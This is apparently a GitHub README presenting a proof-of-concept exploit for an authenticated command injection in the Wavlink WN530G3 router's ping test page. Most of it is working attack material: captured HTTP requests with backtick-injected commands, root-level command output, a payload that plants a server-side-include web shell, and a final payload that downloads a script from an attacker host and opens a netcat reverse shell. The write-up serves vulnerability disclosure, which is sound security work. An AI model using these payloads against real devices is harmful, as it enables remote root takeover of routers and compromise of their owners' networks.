# Wavlink-WN530G3-Cmd-Injection-RCE
This repo details the proof of concept exploit code for the Wavlink WN530G3 router

# Command Injection in Wavlink WN530G3
- Model QUANTUM D2G/WL-WN530G3A
- You may browse all firmware for this model router from this url: https://docs.wavlink.xyz/Firmware/fm-530g3a/
- You may obtain a copy of the firmware from this url: https://files2.wavlink.com/drivers/fw/WN530G3A_20230616_WAVLINK_M30G3_V230616.bin
- This is an authenticated command injection vulnerability, valid credentials are required to exploit this vulnerability.
- Navigate to the router URL, my example device is running on 127.0.0.1
- Provide the valid password in order to login to the device
- After authenticating you will be directed to `/main.shtml`
- Select the Gear icon that states `Setup` on the bottom right of the displayed page
- Look for the `Ping Test` option, and select it
- A Page will be displayed allowing you to ping a local or remote host. This page is where the authenticated command injection vulnerability is.
- To manually verify this vulnerability ensure Burp Suite is running and you capture a request to ping 127.0.0.1 or another ip of your choosing.
## A Normal Request (No Injection)
````
POST /cgi-bin/adm.cgi HTTP/1.1
Host: 127.0.0.1
Content-Length: 54
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: http://127.0.0.1
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: iframe
Referer: http://127.0.0.1/ping.shtml?r=47439
Accept-Encoding: gzip, deflate, br
Cookie: session=1920444770
Connection: keep-alive

page=ping_test&CCMD=5&pingIp=127.0.0.1
````
- Above is what a normal ping request looks like when 127.0.0.1 is the selected target ip address.
- The router will ping the target 5 times
## A Normal Response (No Injection)
- This is what a normal non injected response looks like
````
HTTP/1.1 200 OK
Content-Length: 35
Date: Mon, 11 Aug 2025 19:44:13 GMT
Server: lighttpd

pingIp = 127.0.0.1
````

## Cmd Injection
- This is the payload for the command injection
````
POST /cgi-bin/adm.cgi HTTP/1.1
Host: 127.0.0.1
Content-Length: 54
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: http://127.0.0.1
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: iframe
Referer: http://127.0.0.1/ping.shtml?r=47439
Accept-Encoding: gzip, deflate, br
Cookie: session=1920444770
Connection: keep-alive

page=ping_test&CCMD=5&pingIp=127.0.0.1`ls>/tmp/ls.out`
````
- This will run the `ls` binary on target and dump the results out to `/tmp/ls.out`
## A Successful Injection Response
- This is the output when the injection was successful. You will see the command run reflected back to you in Burp Suite
````
HTTP/1.1 200 OK
Content-Length: 35
Date: Mon, 11 Aug 2025 19:44:13 GMT
Server: lighttpd

pingIp = 127.0.0.1`ls>/tmp/ls.out`
````
- When a payload is run this is what it looks like in the process list
````
21330 rootws    1224 S    /etc/lighttpd/www/cgi-bin/adm.cgi
21333 rootws    1296 S    sh -c ping "127.0.0.1`ps>/tmp/ps.out`" -W 1 -c 5 > /
21334 rootws    1296 R    ps
````
## Better Payloads
- We can certainly make a better payload than this!
- Lets take it a step further and have a way to remotely retrieve the command output. Additionally lets find a way to run multiple commands at a time!
````
# request payload
page=ping_test&CCMD=1&pingIp=127.0.0.1`(id; uname -a; ps)>/etc/lighttpd/www/diag.txt`

# response payload
pingIp = 127.0.0.1`(id; uname -a; ps)>/etc/lighttpd/www/diag.txt`
````
- Now we can simply curl to see the command output.
````
curl http://127.0.0.1/diag.txt
uid=0(rootws) gid=0(root) groups=0(root),10
Linux MIPSX 2.6.32.5 #9 Tue Dec 21 03:19:53 IST 2021 mips GNU/Linux
  PID USER       VSZ STAT COMMAND
    1 rootws    1936 S    init
    2 rootws       0 SW   [kthreadd]
    3 rootws       0 SW   [ksoftirqd/0]
--snip--
23658 rootws    1224 S    /etc/lighttpd/www/cgi-bin/adm.cgi
23661 rootws    1296 S    sh -c ping "127.0.0.1`(id; uname -a; ps)>/etc/lightt
23662 rootws    1296 R    ps
31930 rootws    1308 S    /usr/sbin/dropbear -p 22222 -R
31932 rootws    1948 S    -sh
````
- By using `curl` to retrieve our cmd output and by utilizing `()` we can chain together a whole string of commands!
## Upgrade to Webshell
- After attempting to upgrade to a fully featured webshell, below is the best I could manage.
- We have two payloads, the first simply runs the `id` command. By browsing to `poc.shtml` you will see the output of the `id` command. 
Note: The output is truncated on the page, however you can highlight, copy, and paste the output into a text file for viewing.
- The second payload is a more fully featured survey command. The output, as you can see is not well formatted. I recommend staying away from these options and simply writing the output to a text file in the webroot and then curling the output.
- payload
````
page=ping_test&CCMD=1&pingIp=127.0.0.1`(echo '<input type="visible" id="poc" name="poc" value="<!--#exec cmd="/bin/sh -c id"-->" />' > /etc/lighttpd/www/poc.shtml;chmod 777 /etc/lighttpd/www/poc.shtml)`

## larger survey cmd
page=ping_test&CCMD=1&pingIp=127.0.0.1`(echo '<input type="visible" id="poc" name="poc" value="<!--#exec cmd="/bin/sh -c id;ls -al /;ps; ls -la;"-->" />' > /etc/lighttpd/www/poc.shtml;chmod 777 /etc/lighttpd/www/poc.shtml)`
# output
uid=0(rootws) gid=0(root) groups=0(root),10drwxr-xr-x   18 sfroot   1000          4096 Aug 11 18:12 .drwxr-xr-x   18 sfroot   1000          4096 Aug 11 18:12 ..drwxr-xr-x    2 rootws   root          4096 Aug 11 18:12 .emuxdrwxr-xr-x    2 sfroot   1000          4096 Apr  3  2023 bindrwxr-xr-x    2 sfroot   1000          4096 Aug 11 18:12 devdrwxr-xr-x   17 sfroot   1000          4096 Apr  3  2023 etcdrwxrwxr-x   11 sfroot   1000          4096 Apr  3  2023 libdrwxr-xr-x    2 sfroot   1000          4096 Apr  3  2023 mntdrwxr-xr-x    2 sfroot   1000          4096 Apr  3  2023 overlaydr-xr-xr-x   61 rootws   root             0 Aug 11 18:12 procdrwxrwxr-x    3 sfroot   1000          4096 Aug 11 05:45 romdrwxr-xr-x    2 sfroot   1000          4096 Apr  3  2023 rootdrwxr-xr-x    2 sfroot   1000          4096 Apr  3  2023 sbindrwxr-xr-x   12 rootws   root             0 Aug 11 18:12 sysdrwxrwxrwt   11 sfroot   1000          4096 Aug 11 21:01 tmpdrwxr-xr-x    7 sfroot   1000          4096 Apr  3  2023 usrlrwxrwxrwx    1 sfroot   1000             3 Apr  3  2023 var -> tmpdrwxr-xr-x    2 sfroot   1000          4096 Apr  3  2023 wavlinkdrwxr-xr-x    3 sfroot   1000          4096 Apr  3  2023 www  PID USER       VSZ STAT COMMAND    1 rootws    1936 S    init    2 rootws       0 SW   [kthreadd]    3 rootws       0 SW   [ksoftirqd/0]    4 rootws       0 SW   [events/0]    5 rootws       0 SW   [khelper]    8 rootws       0 SW   [async/mgr]  102 rootws       0 SW   [sync_supers]  104 rootws       0 SW   [bdi-default]  105 rootws       0 SW   [kblockd/0]  113 rootws       0 SW   [kseriod]  138 rootws       0 SW   [rpciod/0]  149 rootws       0 SW   [kswapd0]  150 rootws       0 SW   [aio/0]  151 rootws       0 SW   [nfsiod]  153 rootws       0 SW   [crypto/0]  335 rootws       0 SW   [scsi_tgtd/0]  341 rootws       0 SW   [mtdblockd]  378 rootws    1928 S    /sbin/syslogd -n  382 rootws    1924 S    /sbin/klogd -n  398 rootws    6952 S    /usr/sbin/haveged -w 1024 -r 0  405 rootws    1024 S    dcron -L /dev/null  411 rootws    1284 S    /usr/sbin/dropbear -p 22222 -R  422 rootws    1052 S    /sbin/agetty -p -L ttyS0 115200 vt100  423 rootws    1308 S    /usr/sbin/dropbear -p 22222 -R  424 rootws    1944 S    -sh  444 rootws    3552 S    {run-init} /bin/bash ./run-init  460 rootws    1296 S    /bin/sh /.emux/emuxinit  864 rootws    1296 S    /bin/sh /usr/sbin/check_wan_status.sh  928 rootws    1308 S    /usr/sbin/dropbear -p 22222 -R  933 rootws    1944 S    -sh  992 rootws    1308 S    /bin/sh /bin/curl.sh 1015 rootws    1412 S    /sbin/procd 1017 rootws       0 Z    [procd] 1069 rootws    3548 S    {run-binsh} /bin/bash ./run-binsh 1081 rootws    1296 S    /bin/sh /.emux/emuxshell 1082 rootws    1308 S    /bin/sh 4746 rootws       0 SW   [flush-0:13] 6545 rootws    1932 S    /bin/sh -c sleep 50; /root/test-eth0.sh >/dev/null 2 6547 rootws    1924 S    sleep 50 6816 rootws    1296 S    sleep 2 6821 rootws    1296 S    sleep 5 6831 rootws    1296 S    sleep 30 6844 rootws    1296 S    sleep 5 6845 rootws    1296 S    sh -c /bin/sh -c id;ls -al /;ps; ls -la; 6848 rootws    1296 R    ps 9369 rootws    1300 S    /bin/sh /usr/sbin/check_dnsmasq.sh 9388 rootws    1304 S    /bin/sh /usr/sbin/check_network_status.sh 9416 rootws    5792 S    /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf31930 rootws    1308 S    /usr/sbin/dropbear -p 22222 -R31932 rootws    1948 S    -shdrwxr-xr-x   18 sfroot   1000          4096 Aug 11 18:12 .drwxr-xr-x   18 sfroot   1000          4096 Aug 11 18:12 ..drwxr-xr-x    2 rootws   root          4096 Aug 11 18:12 .emuxdrwxr-xr-x    2 sfroot   1000          4096 Apr  3  2023 bindrwxr-xr-x    2 sfroot   1000          4096 Aug 11 18:12 devdrwxr-xr-x   17 sfroot   1000          4096 Apr  3  2023 etcdrwxrwxr-x   11 sfroot   1000          4096 Apr  3  2023 libdrwxr-xr-x    2 sfroot   1000          4096 Apr  3  2023 mntdrwxr-xr-x    2 sfroot   1000          4096 Apr  3  2023 overlaydr-xr-xr-x   60 rootws   root             0 Aug 11 18:12 procdrwxrwxr-x    3 sfroot   1000          4096 Aug 11 05:45 romdrwxr-xr-x    2 sfroot   1000          4096 Apr  3  2023 rootdrwxr-xr-x    2 sfroot   1000          4096 Apr  3  2023 sbindrwxr-xr-x   12 rootws   root             0 Aug 11 18:12 sysdrwxrwxrwt   11 sfroot   1000          4096 Aug 11 21:01 tmpdrwxr-xr-x    7 sfroot   1000          4096 Apr  3  2023 usrlrwxrwxrwx    1 sfroot   1000             3 Apr  3  2023 var -> tmpdrwxr-xr-x    2 sfroot   1000          4096 Apr  3  2023 wavlinkdrwxr-xr-x    3 sfroot   1000          4096 Apr  3  2023 www
````
## Reverse shell
- The holy grail in exploitation, the reverse shell.
- It would be rather easy with the above payloads to simply `wget` or `curl` a reverse shell and execute it.
- Lets get our listener set up
````
EMUX HOSTFS [WN530G3]:~> ifconfig
eth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56  
          inet addr:192.168.100.2  Bcast:192.168.100.255  Mask:255.255.255.0
          inet6 addr: fe80::5054:ff:fe12:3456/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:777252 errors:10 dropped:26 overruns:0 frame:0
          TX packets:776983 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:249303225 (237.7 MiB)  TX bytes:131854881 (125.7 MiB)
          Interrupt:11 Base address:0x1020 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:15740 errors:0 dropped:0 overruns:0 frame:0
          TX packets:15740 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:1247888 (1.1 MiB)  TX bytes:1247888 (1.1 MiB)

EMUX HOSTFS [WN530G3]:~> nc -nlvp 8888
````
- Start webserver
````
python3 -m http.server
````
- create the payload script
````
#!/bin/sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.100.2 8888 >/tmp/f
````
- burp suite payload final
````
page=ping_test&CCMD=1&pingIp=127.0.0.1`(curl http://192.168.100.2:8000/shell.sh -o /tmp/shell.sh; chmod 777 /tmp/shell.sh; /tmp/shell.sh)`
````
- This payload will yield us a reverse shell on the target
